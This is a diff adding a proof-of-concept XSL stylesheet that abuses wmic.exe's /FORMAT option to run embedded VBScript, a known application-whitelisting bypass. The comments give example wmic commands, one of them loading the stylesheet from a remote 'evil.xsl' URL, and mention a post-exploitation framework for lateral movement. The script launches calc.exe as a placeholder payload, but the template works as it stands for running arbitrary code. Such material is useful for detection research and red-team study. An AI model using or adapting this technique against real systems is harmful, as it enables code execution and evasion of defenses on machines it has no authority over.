@@ -1,0 +1,29 @@
+<xsl:stylesheet  xmlns:xsl="http://www.w3.org/TR/WD-xsl">
+<!--
+Original publication:
+https://subt0x11.blogspot.lu/2018/04/wmicexe-whitelisting-bypass-hacking.html
+
+Proof of concept based on C:\Windows\System32\wbem\texttable.xsl
+
+PoC examples:
+wmic process LIST /FORMAT:"C:\Users\WMI\poc-wmic.xsl"
+
+OR:
+wmic process get brief /format:"C:\Users\WMI\poc-wmic.xsl" 
+wmic process LIST /FORMAT:"\\127.0.0.1\c$\Users\WMI\poc-wmic.xsl"
+
+Remote File example:
+wmic os get /FORMAT:"https://example.com/evil.xsl"
+
+Post-exploit Project that already implement this king of lateral movement:
+https://github.com/zerosum0x0/koadic
+-->
+
+<xsl:script language="VBScript"><![CDATA[
+Set shl = CreateObject("Wscript.Shell")  
+Call shl.Run("""calc.exe""")  
+  ]]></xsl:script>
+<xsl:template match="/"><xsl:apply-templates select="//RESULTS"/><xsl:apply-templates select="//INSTANCE"/><xsl:eval no-entities="true" language="VBScript">DisplayValues(this)</xsl:eval></xsl:template>
+<xsl:template match="RESULTS"><xsl:eval no-entities="true" language="VBScript">CountResults(this)</xsl:eval></xsl:template>
+<xsl:template match="INSTANCE"><xsl:eval language="VBScript">GotInstance()</xsl:eval><xsl:apply-templates select="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"/></xsl:template>
+</xsl:stylesheet>
